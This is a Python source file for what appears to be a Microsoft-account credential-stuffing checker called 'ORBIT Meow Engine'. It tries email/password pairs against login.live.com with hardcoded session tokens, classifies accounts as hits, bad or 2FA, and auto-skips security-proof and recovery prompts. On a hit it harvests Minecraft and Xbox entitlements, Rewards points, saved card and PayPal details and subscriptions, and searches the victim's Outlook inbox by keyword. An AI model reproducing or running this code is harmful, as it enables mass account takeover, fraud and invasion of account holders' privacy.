"""
ORBIT Meow Engine — v2
Best logic from meow.py (spykii login, Xbox/MC, MS enrichment)
+ Go code (bypass functions, JWT profile, keyword detection).
Fixes: static config fallback, retry logic, expanded success detection.
"""
import re, time, uuid, json, base64, urllib.parse, threading
import requests
import logging
from typing import Optional, Tuple, Dict, List, Any

logger = logging.getLogger(__name__)

_UA_MOB  = 'Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 PKeyAuth/1.0'
_UA_DESK = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

# ─── Static login configs from meow.py (proven working) ──────────────────────
_LOGIN_CONFIGS = [
    dict(
        url=(
            'https://login.live.com/ppsecure/post.srf'
            '?username=%7bemail%7d&client_id=0000000048170EF2'
            '&contextid=072929F9A0DD49A4&opid=D34F9880C21AE341'
            '&bk=1765024327&uaid=a5b22c26bc704002ac309462e8d061bb'
            '&pid=15216&prompt=none'
        ),
        ppft=(
            '-Drzud3DzKKJtVD9IfM5xwJywwEjJp5zvvJmrSyu*RKOf'
            '!PbgSCQ7ReuKFS*sIpTV5r28epGtqBhqH3JYvND4!onwSWz'
            '2JEkvdeewUQC6HmAXRgjYBzSlf0mjEYbx3ULc7oy5fUK3LDS'
            'b*CnkAG03FLzwVPmT5WjYu4sE5Wqd93pCx0USJK4jelAWNvs'
            'Mog0Rmj90tmeCd*1pDYjkINyPEgQSkv6y5GPuX!GmYwKccALU'
            't*!SRaI02p*XUqePtNtJzw$$'
        ),
        cookie=(
            'MSPRequ=id=N&lt=1765024327&co=1; '
            'uaid=a5b22c26bc704002ac309462e8d061bb; '
            'MSPOK=$uuid-90ce4cdb-2718-4d7e-9889-4136cfacc5b2'
        ),
    ),
    dict(
        url=(
            'https://login.live.com/ppsecure/post.srf'
            '?username=%7bemail%7d&client_id=0000000048170EF2'
            '&contextid=F3FB0F6AB3D6991E&opid=5F188DEDF4A1266A'
            '&bk=1768757278&uaid=b1d1e6fbf8b24f9b8a73b347b178d580'
            '&pid=15216&prompt=none'
        ),
        ppft=(
            '-Dm65IQ!FOoxUaTQnZAHxYJMOmOcAmTQz4qm3kTra6EWGgOJS3Hmm'
            'MLM4kwOpB*SxcpnorGvu6Meyzvos0ruiOkVKAh!SdkWlD5KUiiUUpV'
            'aBaRmY4op*aKCNkOPi2mBbWnS0mXOvSG7dMuL!5HdVFTPtGTdlQZCu'
            'cF7LVMbr2BWN6qhWxoXXrBMfvx3BcxGFhNZgbDooHcWy8QO4OOYEXVI'
            '2ee3UOWa!S2qTtgO3nriTV67BP7!q8QgpyDMkckNSHQ$$'
        ),
        cookie=(
            'MSFPC=GUID=cd3df40453784149a05eb0e8d7b0aaf5&HASH=cd3d&LV=202510&V=4; '
            'MUID=009CC129162F6E173020D77717446F0A; '
            'uaid=b1d1e6fbf8b24f9b8a73b347b178d580; '
            'MSPRequ=id=N&lt=1768757278&co=1; '
            'MSPOK=$uuid-a26bdf97-2619-4f16-ba61-6b189e1f6e0f'
        ),
    ),
]
_cfg_lock    = threading.Lock()
_cfg_toomany = [0] * len(_LOGIN_CONFIGS)
_cfg_reset_at = [0.0] * len(_LOGIN_CONFIGS)

def _record_toomany(idx: int):
    now = time.time()
    with _cfg_lock:
        if now - _cfg_reset_at[idx] > 60:
            _cfg_toomany[idx] = 0
            _cfg_reset_at[idx] = now
        _cfg_toomany[idx] += 1


# ═══════════════════════════════════════════════════════════════════════════════
# FRESH PPFT  (meow.py _get_fresh_ppft_spykii)
# ═══════════════════════════════════════════════════════════════════════════════
def get_fresh_ppft(email: str, session: requests.Session) -> Optional[Tuple[str,str,str]]:
    """Returns (url_post, ppft, cookie_str) or None."""
    for _ in range(2):
        try:
            r = session.get(
                'https://login.live.com/oauth20_authorize.srf',
                params={
                    'client_id':     '0000000048170EF2',
                    'redirect_uri':  'https://login.live.com/oauth20_desktop.srf',
                    'response_type': 'token',
                    'scope':         'offline_access openid profile service::outlook.office.com::MBI_SSL',
                    'display':       'touch',
                    'login_hint':    email,
                    'msproxy':       '1',
                },
                headers={
                    'User-Agent':        _UA_MOB,
                    'client-request-id': str(uuid.uuid4()),
                    'Accept':            'text/html,*/*',
                },
                timeout=10,
            )
            text = r.text
            if '"urlPost":"' not in text:
                continue
            url_post = text.split('"urlPost":"')[1].split('",')[0]

            ppft = None
            for start, end in [
                ('name=\\"PPFT\\" id=\\"i0327\\" value=\\"', '\\"'),
                ('name="PPFT" id="i0327" value="',            '"'),
                ('"sFT":"',                                   '"'),
                ("sFTTag:'",                                  "'"),
            ]:
                if start in text:
                    try:
                        v = text.split(start)[1].split(end)[0]
                        if v and len(v) > 10:
                            ppft = v; break
                    except Exception:
                        continue
            if not ppft:
                continue

            ck = r.cookies.get_dict()
            parts = [f'{k}={ck[k]}' for k in
                     ('MSPRequ','uaid','MSPOK','OParams','MSFPC','MUID') if ck.get(k)]
            if not parts:
                parts.append(f'MSPOK=$uuid-{uuid.uuid4()}')
            return url_post, ppft, '; '.join(parts)
        except Exception:
            continue
    return None


# ═══════════════════════════════════════════════════════════════════════════════
# BYPASS HELPERS  (Go code)
# ═══════════════════════════════════════════════════════════════════════════════
def _extract_hidden(body: str, name: str) -> str:
    for pat in [
        f'name="{name}" id="{name}" value="',
        f'id="{name}" name="{name}" value="',
        f'name="{name}" value="',
        f'id="{name}" value="',
    ]:
        idx = body.find(pat)
        if idx >= 0:
            rest = body[idx + len(pat):]
            end  = rest.find('"')
            if end > 0:
                return rest[:end]
    return ''

def _extract_action(body: str, form_id: str) -> str:
    for pat in [
        f'id="{form_id}" method="post" action="',
        f'id="{form_id}" action="',
        f'method="post" id="{form_id}" action="',
        f'name="{form_id}" id="{form_id}" action="',
        f'name="{form_id}" method="post" action="',
    ]:
        idx = body.find(pat)
        if idx >= 0:
            rest = body[idx + len(pat):]
            end  = rest.find('"')
            if end > 0:
                v = rest[:end]
                if 'http' in v:
                    return v
    return ''

def _bypass_proofs(session: requests.Session, body: str):
    fmhf = _extract_action(body, 'fmHF') or _extract_action(body, 'iProofsForm')
    if not fmhf:
        return
    try:
        r2 = session.post(fmhf, data={
            'ipt':   _extract_hidden(body, 'ipt'),
            'pprid': _extract_hidden(body, 'pprid'),
            'uaid':  _extract_hidden(body, 'uaid'),
        }, headers={'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': _UA_DESK,
                    'Referer': 'https://account.live.com/'},
           timeout=8, allow_redirects=True)
        action2 = (_extract_action(r2.text, 'frmAddProof') or
                   _extract_action(r2.text, 'fmHF'))
        if action2:
            session.post(action2, data={
                'iProofOptions': 'Email', 'action': 'Skip',
                'canary': _extract_hidden(r2.text, 'canary'),
                'DisplayPhoneCountryISO': 'US',
                'DisplayPhoneNumber': '', 'EmailAddress': '',
                'PhoneNumber': '', 'PhoneCountryISO': '',
            }, headers={'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': _UA_DESK},
               timeout=8, allow_redirects=True)
    except Exception:
        pass

def _bypass_privacy(session: requests.Session, body: str):
    priv = (_extract_action(body, 'fmHF') or
            _extract_action(body, 'privacyForm'))
    if not priv:
        return
    try:
        cod = _extract_hidden(body, 'code') or _extract_hidden(body, 'state')
        session.post(priv, data={
            'correlation_id': _extract_hidden(body, 'correlation_id'),
            'code':           cod,
            'client_info':    _extract_hidden(body, 'client_info'),
            'action':         'accept',
        }, headers={'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': _UA_DESK,
                    'Origin': 'https://login.live.com',
                    'Referer': 'https://login.live.com/'},
           timeout=8, allow_redirects=True)
    except Exception:
        pass

def _bypass_update(session: requests.Session, body: str) -> bool:
    action = (_extract_action(body, 'fmHF') or
              _extract_action(body, 'updateForm'))
    if not action:
        return False
    try:
        r = session.post(action, data={
            'action': 'Skip',
            'canary': _extract_hidden(body, 'canary'),
            'pprid':  _extract_hidden(body, 'pprid'),
            'uaid':   _extract_hidden(body, 'uaid'),
            'ipt':    _extract_hidden(body, 'ipt'),
        }, headers={'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': _UA_DESK},
           timeout=8, allow_redirects=True)
        return r.status_code == 200
    except Exception:
        return False


# ═══════════════════════════════════════════════════════════════════════════════
# LOGIN ATTEMPT  (meow.py _spykii_attempt + Go keywords)
# ═══════════════════════════════════════════════════════════════════════════════
def spykii_attempt(session: requests.Session, email: str, password: str,
                   url: str, ppft: str, cookie: str):
    _BAD = (
        'your account or password is incorrect', 'password is incorrect',
        "that microsoft account doesn't exist", "account doesn't exist",
        "we couldn't find an account", 'incorrect username or password',
        'the email address or password is incorrect',
        'sign-in name or password does not match',
    )
    _2FA = (
        'two-step verification', 'two-step', 'two factor',
        'verify your identity', 'verification code', 'enter the code',
        'authenticator app', 'microsoft authenticator', 'approve the request',
        'sign-in was blocked', 'account is locked', 'account has been locked',
        'unusual activity', 'suspicious activity', 'confirm your identity',
        'help us protect your account', 'keep your account secure',
        'we need to verify', "prove it's you",
    )
    _2FA_RAW = (
        '/cancel?mkt=', '/abuse?mkt=', '/Abuse?mkt=',
        'identity/confirm', 'account.live.com/recover?mkt',
        '/Proofs/Verify', 'proofs/verify',
    )
    _TOOMANY = (
        'you have tried too many times', 'tried too many',
        'too many incorrect password', ',ac:null,',
    )

    c429 = 0
    for _iter in range(8):
        try:
            r = session.post(
                url,
                data={
                    'ps': '2', 'psRNGCDefaultType': '1',
                    'psRNGCEntropy': '', 'psRNGCSLK': ppft,
                    'canary': '', 'ctx': '', 'hpgrequestid': '',
                    'PPFT': ppft, 'PPSX': 'Pas', 'NewUser': '1',
                    'FoundMSAs': '', 'fspost': '0', 'i21': '0',
                    'CookieDisclosure': '0', 'IsFidoSupported': '1',
                    'isSignupPost': '0', 'isRecoveryAttemptPost': '0',
                    'i13': '1', 'login': email, 'loginfmt': email,
                    'type': '11', 'LoginOptions': '1',
                    'lrt': '', 'lrtPartition': '',
                    'hisRegion': '', 'hisScaleUnit': '',
                    'passwd': password,
                },
                headers={
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Cookie':       cookie,
                    'User-Agent':   _UA_MOB,
                    'Referer':      'https://login.live.com/',
                    'Origin':       'https://login.live.com',
                    'Accept':       'text/html,application/xhtml+xml,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate',
                    'Upgrade-Insecure-Requests': '1',
                },
                timeout=12, allow_redirects=False,
            )
        except Exception:
            return 'ERROR'

        code = r.status_code
        if code == 429:
            c429 += 1
            if c429 >= 3:
                return 'ERROR'
            time.sleep(min(3 * c429, 8))
            continue
        if code >= 500:
            time.sleep(0.3)
            if _iter >= 1:
                return 'ERROR'
            continue

        # Token in Location header
        loc = r.headers.get('Location', '')
        if 'access_token=' in loc:
            try:
                tok = urllib.parse.unquote(loc.split('access_token=')[1].split('&')[0])
                if tok and tok != 'None':
                    return session, tok
            except Exception:
                pass
        if 'srf?code=' in loc or 'oauth20_desktop.srf?' in loc:
            return session, None

        # 3xx redirect to Microsoft domain = HIT
        if code in (301, 302, 303, 307, 308):
            ms_domains = ('account.microsoft.com', 'outlook.live.com',
                          'www.bing.com', 'www.xbox.com', 'login.microsoftonline.com')
            if any(d in loc for d in ms_domains):
                return session, None

        # Cookie-based success
        try:
            ck = {c.name: c.value for c in session.cookies}
        except Exception:
            ck = {}
        if any(ck.get(n) for n in ('ANON', 'WLSSC', 'MSPAuth', 'MSPCID')):
            return session, None

        try:
            body = r.text.lower()
            raw  = r.text
        except Exception:
            return 'ERROR'

        # Rate limited
        if any(k in body for k in _TOOMANY):
            return 'ERROR'

        # Bad credentials
        if any(k in body for k in _BAD):
            return 'None'

        # 2FA / blocked
        if (any(k in body for k in _2FA) or
                any(k in raw for k in _2FA_RAW)):
            return '2FA'

        # ── Bypass pages ──────────────────────────────────────────────────────
        if 'account.live.com/proofs' in raw:
            _bypass_proofs(session, raw)
            return session, None

        if ('privacynotice.account.microsoft.com' in raw or
                'privacy.microsoft.com' in raw):
            _bypass_privacy(session, raw)
            return session, None

        if ('account.live.com/recover' in raw or
                'account.live.com/ReputationCheck' in raw):
            if _bypass_update(session, raw):
                return session, None

        # Success keywords
        if any(k in raw for k in (
            'account.microsoft.com', 'signout?', 'Sign out', '/SignOut',
            'profile.live.com', 'sSigninName', 'www.xbox.com/en-US/',
            'outlook.live.com/mail', 'outlook.live.com/owa',
            'login.microsoftonline.com', 'SigninName',
        )):
            return session, None

        return 'ERROR'

    return 'ERROR'


# ═══════════════════════════════════════════════════════════════════════════════
# FULL MS LOGIN  (meow.py _ms_login — fresh PPFT + static fallback + retry)
# ═══════════════════════════════════════════════════════════════════════════════
def ms_login(email: str, password: str, session: requests.Session):
    """
    Returns (session, token_or_None) on HIT,
            'None' on BAD, '2FA' on 2FA, 'ERROR' on failure.
    """
    # ── 1. Fresh PPFT (most reliable — per-account cookies) ──────────────────
    fresh = get_fresh_ppft(email, session)
    if fresh:
        url_post, ppft, cookie = fresh
        result = spykii_attempt(session, email, password, url_post, ppft, cookie)
        if result == 'None':  return 'None'
        if result == '2FA':   return '2FA'
        if result != 'ERROR' and result is not None:
            return result

    # ── 2. Static config fallback (from meow.py proven configs) ───────────────
    cfg_order = sorted(range(len(_LOGIN_CONFIGS)),
                       key=lambda i: _cfg_toomany[i])
    for idx in cfg_order:
        cfg = _LOGIN_CONFIGS[idx]
        url = cfg['url'].replace('%7bemail%7d', urllib.parse.quote(email))
        result = spykii_attempt(session, email, password,
                                url, cfg['ppft'], cfg['cookie'])
        if result == 'None':  return 'None'
        if result == '2FA':   return '2FA'
        if result == 'ERROR':
            _record_toomany(idx)
            continue
        if result is not None:
            return result

    # ── 3. Retry with fresh session (last chance) ─────────────────────────────
    try:
        session2 = requests.Session()
        session2.verify = False
        session2.headers['User-Agent'] = _UA_MOB
        fresh2 = get_fresh_ppft(email, session2)
        if fresh2:
            url_post, ppft, cookie = fresh2
            result = spykii_attempt(session2, email, password,
                                    url_post, ppft, cookie)
            if result == 'None':  return 'None'
            if result == '2FA':   return '2FA'
            if result != 'ERROR' and result is not None:
                return result
    except Exception:
        pass

    return 'ERROR'


# ═══════════════════════════════════════════════════════════════════════════════
# SILENT TOKEN
# ═══════════════════════════════════════════════════════════════════════════════
def get_silent_token(session: requests.Session, client_id: str,
                     scope: str, redirect_uri: str,
                     timeout: int = 8) -> Optional[str]:
    try:
        url = (
            f'https://login.live.com/oauth20_authorize.srf'
            f'?client_id={client_id}'
            f'&response_type=token'
            f'&scope={urllib.parse.quote(scope)}'
            f'&redirect_uri={urllib.parse.quote(redirect_uri)}'
            f'&prompt=none'
        )
        r = session.get(url, headers={'User-Agent': _UA_DESK},
                        timeout=timeout, allow_redirects=True)
        for u in [r.url, r.headers.get('Location', '')]:
            if 'access_token=' in (u or ''):
                try:
                    tok = urllib.parse.parse_qs(
                        urllib.parse.urlparse(u).fragment
                    ).get('access_token', [None])[0]
                    if tok:
                        return tok
                except Exception:
                    pass
        if 'access_token=' in r.text:
            try:
                frag = r.text.split('access_token=')[1].split('&')[0]
                tok  = urllib.parse.unquote(frag)
                if tok and len(tok) > 20:
                    return tok
            except Exception:
                pass
    except Exception:
        pass
    return None


# ═══════════════════════════════════════════════════════════════════════════════
# PROFILE  (Go getProfile — JWT cookie)
# ═══════════════════════════════════════════════════════════════════════════════
def get_profile(session: requests.Session) -> Dict[str, str]:
    try:
        session.get('https://account.microsoft.com/',
                    headers={'User-Agent': _UA_DESK}, timeout=8)
    except Exception:
        pass
    # JWT cookie
    try:
        jwt_raw = session.cookies.get('AMCSecAuthJWT', '')
        if jwt_raw:
            parts = jwt_raw.split('.')
            if len(parts) >= 2:
                payload = parts[1]
                payload += '=' * (-len(payload) % 4)
                decoded = json.loads(base64.urlsafe_b64decode(payload))
                name    = decoded.get('name', '')
                country = decoded.get('ctry', '')
                if not name:
                    fn = decoded.get('given_name', '')
                    ln = decoded.get('family_name', '')
                    name = f'{fn} {ln}'.strip()
                if name or country:
                    return {'name': name, 'country': country}
    except Exception:
        pass
    # JSHP fallback
    try:
        jshp = session.cookies.get('JSHP', '')
        if jshp:
            parts = jshp.split('$')
            if len(parts) >= 4:
                name = f'{parts[2].strip()} {parts[3].strip()}'.strip()
                if name:
                    return {'name': name, 'country': ''}
    except Exception:
        pass
    return {'name': '', 'country': ''}


# ═══════════════════════════════════════════════════════════════════════════════
# XBOX / MC CHAIN  (meow.py authenticate XBL→XSTS→MC)
# ═══════════════════════════════════════════════════════════════════════════════
def get_xbox_token(session: requests.Session, ms_token: str) -> Optional[str]:
    tok = get_silent_token(
        session, '00000000402B5328',
        'service::user.auth.xboxlive.com::MBI_SSL',
        'https://login.live.com/oauth20_desktop.srf', timeout=8,
    )
    return tok or ms_token or None

def get_xbl_xsts(session: requests.Session,
                 xbox_token: str) -> Optional[Tuple[str, str]]:
    for rps in [xbox_token, 'd=' + xbox_token]:
        try:
            xbl = session.post(
                'https://user.auth.xboxlive.com/user/authenticate',
                json={'Properties': {'AuthMethod': 'RPS',
                                     'SiteName': 'user.auth.xboxlive.com',
                                     'RpsTicket': rps},
                      'RelyingParty': 'http://auth.xboxlive.com',
                      'TokenType': 'JWT'},
                headers={'Content-Type': 'application/json',
                         'Accept': 'application/json'},
                timeout=10,
            )
            if xbl.status_code != 200:
                continue
            js      = xbl.json()
            xbl_tok = js.get('Token')
            uhs     = js.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs', '')
            if not xbl_tok:
                continue
            xsts = session.post(
                'https://xsts.auth.xboxlive.com/xsts/authorize',
                json={'Properties': {'SandboxId': 'RETAIL',
                                     'UserTokens': [xbl_tok]},
                      'RelyingParty': 'rp://api.minecraftservices.com/',
                      'TokenType': 'JWT'},
                headers={'Content-Type': 'application/json',
                         'Accept': 'application/json'},
                timeout=10,
            )
            if xsts.status_code == 200:
                xsts_tok = xsts.json().get('Token')
                if xsts_tok:
                    return xsts_tok, uhs
        except Exception:
            continue
    return None

def get_mc_token(session: requests.Session,
                 uhs: str, xsts_token: str) -> Optional[str]:
    for _ in range(2):
        try:
            r = session.post(
                'https://api.minecraftservices.com/authentication/login_with_xbox',
                json={'identityToken': f'XBL3.0 x={uhs};{xsts_token}'},
                headers={'Content-Type': 'application/json'},
                timeout=8,
            )
            if r.status_code == 429:
                time.sleep(0.5); continue
            return r.json().get('access_token')
        except Exception:
            continue
    return None

def checkownership(entitlements: dict) -> Optional[str]:
    items  = entitlements.get('items', [])
    normal = gp_pc = gp_ult = False
    for item in items:
        name   = item.get('name', '')
        source = item.get('source', '')
        if name in ('game_minecraft', 'product_minecraft') and \
                source in ('PURCHASE', 'MC_PURCHASE'):
            normal = True
        if name == 'product_game_pass_pc':       gp_pc  = True
        if name == 'product_game_pass_ultimate': gp_ult = True
    if normal and gp_ult: return 'Normal Minecraft (with Game Pass Ultimate)'
    if normal and gp_pc:  return 'Normal Minecraft (with Game Pass)'
    if normal:            return 'Normal Minecraft'
    if gp_ult:            return 'Xbox Game Pass Ultimate'
    if gp_pc:             return 'Xbox Game Pass (PC)'
    return None

def check_minecraft(session: requests.Session,
                    mc_token_str: str) -> Dict[str, Any]:
    result: Dict[str, Any] = {'has_mc': False}
    for _ in range(2):
        try:
            r = session.get(
                'https://api.minecraftservices.com/entitlements/license',
                headers={'Authorization': f'Bearer {mc_token_str}'},
                timeout=10,
            )
            if r.status_code == 429:
                time.sleep(0.5); continue
            if r.status_code != 200:
                break
            acc_type = checkownership(r.json())
            if acc_type is None:
                try:
                    pr = session.get(
                        'https://api.minecraftservices.com/minecraft/profile',
                        headers={'Authorization': f'Bearer {mc_token_str}'},
                        timeout=8,
                    )
                    acc_type = 'Normal Minecraft' if pr.status_code == 200 else None
                except Exception:
                    pass
            if acc_type is None:
                break
            result['has_mc']       = True
            result['account_type'] = acc_type
            result['has_xgp']      = 'Game Pass' in acc_type
            result['xgp_type']     = acc_type if result['has_xgp'] else ''
            try:
                pr = session.get(
                    'https://api.minecraftservices.com/minecraft/profile',
                    headers={'Authorization': f'Bearer {mc_token_str}'},
                    timeout=8,
                )
                if pr.status_code == 200:
                    pd = pr.json()
                    result['username'] = pd.get('name', 'N/A')
                    result['uuid']     = pd.get('id',   'N/A')
                    result['capes']    = [c['alias'] for c in pd.get('capes', [])
                                          if c.get('alias')]
            except Exception:
                pass
            break
        except Exception:
            break
    return result


# ═══════════════════════════════════════════════════════════════════════════════
# REWARDS  (meow.py MicrosoftChecker.check_rewards_points)
# ═══════════════════════════════════════════════════════════════════════════════
def check_rewards(session: requests.Session) -> Optional[str]:
    try:
        hdrs = {'User-Agent': _UA_DESK, 'Pragma': 'no-cache', 'Accept': '*/*'}
        r = session.get('https://rewards.bing.com/', headers=hdrs, timeout=10)
        if ('action="https://rewards.bing.com/signin-oidc"' in r.text or
                'id="fmHF"' in r.text):
            m = re.search('action="([^"]+)"', r.text)
            if m:
                data = {k: v for k, v in
                        re.findall(r'<input type="hidden" name="([^"]+)" id="[^"]+" value="([^"]+)">', r.text)}
                r = session.post(m.group(1), data=data, headers=hdrs, timeout=10)
        matches = re.findall(r',"availablePoints":(\d+)', r.text)
        if matches:
            pts = max(matches, key=int)
            if pts != '0':
                return pts
        session.get('https://www.bing.com/',
                    headers={'User-Agent': _UA_DESK}, timeout=8)
        ts = int(time.time() * 1000)
        rf = session.get(
            f'https://www.bing.com/rewards/panelflyout/getuserinfo?timestamp={ts}',
            headers={'User-Agent': _UA_DESK, 'Accept': 'application/json',
                     'Accept-Encoding': 'identity', 'Referer': 'https://www.bing.com/',
                     'X-Requested-With': 'XMLHttpRequest'},
            timeout=8,
        )
        if rf.status_code == 200:
            d = rf.json()
            ui = d.get('userInfo', {})
            if ui.get('isRewardsUser') and ui.get('balance'):
                return str(ui['balance'])
    except Exception:
        pass
    return None


# ═══════════════════════════════════════════════════════════════════════════════
# PAYMENT  (meow.py MicrosoftChecker.check_payment_instruments)
# ═══════════════════════════════════════════════════════════════════════════════
def check_payment(session: requests.Session) -> List[str]:
    try:
        token = get_silent_token(
            session, '000000000004773A',
            'PIFD.Read PIFD.Create PIFD.Update PIFD.Delete',
            'https://account.microsoft.com/auth/complete-silent-delegate-auth',
            timeout=8,
        )
        if not token:
            return []
        hdrs = {'Authorization': f'MSADELEGATE1.0={token}',
                'Accept': 'application/json', 'User-Agent': _UA_DESK}
        r = session.get(
            'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/'
            'paymentInstrumentsEx?status=active,removed&language=en-GB',
            headers=hdrs, timeout=12,
        )
        instruments = []
        if r.status_code == 200:
            data = r.json()
            if not isinstance(data, list):
                data = data.get('value', []) if isinstance(data, dict) else []
            seen = set()
            for item in data:
                iid = item.get('paymentInstrumentId') or item.get('id', '')
                if iid in seen: continue
                seen.add(iid)
                pm     = item.get('paymentMethod') or item
                family = str(pm.get('paymentMethodFamily', '')).lower()
                if family in ('credit_card', 'debit_card', 'card'):
                    last4 = pm.get('lastFourDigits', 'N/A')
                    month = pm.get('expiryMonth', '')
                    year  = pm.get('expiryYear', '')
                    instruments.append(f"CC: *{last4} ({month}/{year})")
                elif family == 'paypal':
                    instruments.append(f"PayPal: {pm.get('email','N/A')}")
        return instruments
    except Exception:
        return []


# ═══════════════════════════════════════════════════════════════════════════════
# INBOX  (meow.py MicrosoftChecker.check_inbox)
# ═══════════════════════════════════════════════════════════════════════════════
def check_inbox(session: requests.Session,
                email: str,
                keywords: List[str]) -> List[Tuple[str, int]]:
    if not keywords:
        return []
    try:
        token = get_silent_token(
            session, '0000000048170EF2',
            'https://substrate.office.com/User-Internal.ReadWrite',
            'https://login.live.com/oauth20_desktop.srf', timeout=8,
        )
        if not token:
            token = get_silent_token(
                session, '0000000048170EF2',
                'service::outlook.office.com::MBI_SSL',
                'https://login.live.com/oauth20_desktop.srf', timeout=8,
            )
        if not token:
            return []
        cid = session.cookies.get('MSPCID')
        if not cid:
            try:
                session.get('https://outlook.live.com/owa/', timeout=8)
                cid = session.cookies.get('MSPCID')
            except Exception:
                pass
        cid = cid or email.upper()
        hdrs = {
            'Authorization':   f'Bearer {token}',
            'X-AnchorMailbox': f'CID:{cid}',
            'Content-Type':    'application/json',
            'User-Agent':      'Outlook-Android/2.0',
            'Accept':          'application/json',
            'Host':            'substrate.office.com',
        }
        results = []
        for kw in keywords:
            try:
                payload = {
                    'Cvid': str(uuid.uuid4()), 'Scenario': {'Name': 'owa.react'},
                    'TimeZone': 'UTC', 'TextDecorations': 'Off',
                    'EntityRequests': [{'EntityType': 'Conversation',
                                        'ContentSources': ['Exchange'],
                                        'Filter': {'Or': [
                                            {'Term': {'DistinguishedFolderName': 'msgfolderroot'}},
                                            {'Term': {'DistinguishedFolderName': 'DeletedItems'}},
                                        ]},
                                        'From': 0, 'Query': {'QueryString': kw},
                                        'RefiningQueries': None, 'Size': 25,
                                        'EnableTopResults': True, 'TopResultsCount': 3}],
                    'AnswerEntityRequests': [],
                    'QueryAlterationOptions': {'EnableSuggestion': True, 'EnableAlteration': True},
                    'LogicalId': str(uuid.uuid4()),
                }
                r = session.post('https://outlook.live.com/search/api/v2/query?n=124',
                                 json=payload, headers=hdrs, timeout=12)
                found = 0
                if r.status_code == 200:
                    for es in r.json().get('EntitySets', []):
                        for rs in es.get('ResultSets', []):
                            found += (rs.get('Total') or rs.get('ResultCount') or
                                      len(rs.get('Results', [])))
                elif r.status_code in (401, 403, 404):
                    break
                if found == 0:
                    try:
                        rr = session.get(
                            f'https://outlook.live.com/api/v2.0/me/messages'
                            f'?$search="{kw}"&$top=10&$select=Subject',
                            headers=hdrs, timeout=8)
                        if rr.status_code == 200:
                            found = len(rr.json().get('value', []))
                        elif rr.status_code in (401, 403, 404):
                            break
                    except Exception:
                        pass
                if found > 0:
                    results.append((kw, found))
            except Exception:
                continue
        return results
    except Exception:
        return []


# ═══════════════════════════════════════════════════════════════════════════════
# SUBSCRIPTIONS
# ═══════════════════════════════════════════════════════════════════════════════
def check_subscriptions(session: requests.Session) -> List[str]:
    try:
        r = session.get('https://account.microsoft.com/services/api/subscriptions',
                        headers={'User-Agent': _UA_DESK}, timeout=10)
        subs = []
        if r.status_code == 200:
            for item in r.json():
                if item.get('status') == 'Active':
                    name  = item.get('productName', 'Unknown')
                    recur = item.get('recurrenceState', '')
                    subs.append(f'{name} ({recur})' if recur else name)
        return subs
    except Exception:
        return []
